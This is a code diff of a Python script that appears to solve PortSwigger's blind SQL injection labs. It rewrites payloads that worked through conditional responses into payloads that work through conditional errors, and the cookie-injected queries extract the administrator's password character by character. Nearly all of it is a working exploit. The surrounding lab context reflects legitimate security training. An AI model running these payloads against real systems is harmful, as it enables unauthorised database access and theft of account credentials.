@@ -1,5 +1,5 @@
 # PortSwigger
-# Lab: Blind SQL injection with conditional responses
+# Lab: Blind SQL injection with conditional errors
 
 import sys
 import requests
@@ -32,7 +32,7 @@ def get_password_length(max_length):
 
     for i in range(1, max_length + 1):
 
-        sqli_playload = "' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = %s--" % (i)
+        sqli_playload = "' AND (SELECT CASE WHEN LENGTH(password) = %s THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a" % (i)
         cookies["TrackingId"] = tracking_id + urllib.parse.quote(sqli_playload)
 
         response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
@@ -40,7 +40,7 @@ def get_password_length(max_length):
         sys.stdout.write("\r" + str(i))
         sys.stdout.flush()
 
-        if "Welcome" in response.text:                
+        if response.status_code == 500:
             return i
         
         
@@ -53,7 +53,7 @@ def get_password(password_length):
         
         for j in range(0, len(characters)):
 
-            sqli_playload = "' AND (SELECT SUBSTRING(password,%s,1) FROM users WHERE username = 'administrator') = '%s" % (i, characters[j])
+            sqli_playload = "' AND (SELECT CASE WHEN SUBSTR(password,%s,1) = '%s' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a" % (i, characters[j])
             cookies["TrackingId"] = tracking_id + urllib.parse.quote(sqli_playload)
 
             response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
@@ -61,7 +61,7 @@ def get_password(password_length):
             sys.stdout.write('\r' + password_extracted + characters[j])
             sys.stdout.flush()
 
-            if "Welcome" in response.text:
+            if response.status_code == 500:
                 password_extracted += characters[j]
                 break
 
